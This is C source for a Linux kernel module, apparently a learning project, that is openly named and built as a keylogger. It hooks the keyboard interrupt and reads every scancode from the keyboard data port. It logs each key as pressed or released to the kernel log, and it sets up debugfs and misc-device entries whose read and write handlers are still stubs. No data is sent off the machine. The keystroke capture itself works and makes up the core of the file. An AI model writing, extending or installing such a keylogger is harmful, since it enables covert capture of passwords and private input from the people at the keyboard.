#include "./keyboard.h"

#define PATH "keylog"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("stmartin");
MODULE_DESCRIPTION("Module keylog");

static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset);
static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset);

struct dentry		*dir_entry, *file_entry;
//static unsigned short	kbd_buffer = 0x0000;

static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
{
	printk(KERN_INFO "in key_write\n");
	return 1;
}

static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
{
	printk(KERN_INFO "keylogger: in read\n");
	return 0;
}

static struct file_operations	key_ops = {

	.owner = THIS_MODULE,
	.write = key_write,
	.read = key_read
};

static struct miscdevice	key_dev = {
	.minor = MISC_DYNAMIC_MINOR,
        .name = "keylogger",
        .fops = &key_ops
};

static int		create_dir(void)
{
	dir_entry = debugfs_create_dir(PATH, NULL);
	if (dir_entry == ERR_PTR(-ENODEV))
	{
		printk(KERN_INFO "failed create debugfs, CONFIG_DEBUG_FS have to be set yes\n");
		return 0;
	}
	else if (dir_entry == NULL)
	{
		printk(KERN_INFO "dir_entry is NULL in create_dir\n");
		return 0;
	}
	printk(KERN_INFO "dir_entry have been successfully created\n");
	return 1;
}

static int		create_file(const char *name, umode_t mode, struct file_operations *fops)
{
	file_entry = debugfs_create_file(name, mode, dir_entry, NULL, fops);
	if (file_entry == NULL)
	{
		printk(KERN_INFO "file creation failed\n");
		return 0;
	}
	printk(KERN_INFO "[%s] file have been well created\n", name);
	return 1;
}

static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
{
	unsigned char /*status, */scancode;

//	status = inb(KEYBOARD_STATUS);
	scancode = inb(KEYBOARD_DATA);
//	kbd_buffer = (unsigned short) ((status << 8) | (scancode & 0x00ff));
	printk(KERN_INFO "Scan Code %c %s\n",
            keyboard_map[scancode & KBD_SCANCODE_MASK],
            scancode & KBD_STATUS_MASK ? "Released" : "Pressed");
	return IRQ_HANDLED;
}

static int		__init keylogger_init(void)
{
	printk(KERN_INFO "in keylogger init function \n");
	if (create_dir() != 1)
	{
		printk(KERN_INFO "creation directory failed\n");
		return 1;
	}
	if (create_file("keylogs", 0660, &key_ops) != 1)
	{
		printk(KERN_INFO "file creation failed \n");
		return 1;
	}
	if (misc_register(&key_dev))
		return 1;
	printk(KERN_INFO "keylogger: name [%s] minor  [%i]\n", key_dev.name, key_dev.minor);
	if (request_irq(KBD_IRQ, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler))
	{
		printk(KERN_INFO "something went wrong in request_irq\n");
		return -EIO;
	}
	return 0;
}

static void		__exit keylogger_exit(void)
{
	printk(KERN_INFO "exit keylogger\n");
	free_irq(KBD_IRQ, (void *)kbd_irq_handler);
	debugfs_remove_recursive(dir_entry);
	misc_deregister(&key_dev);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
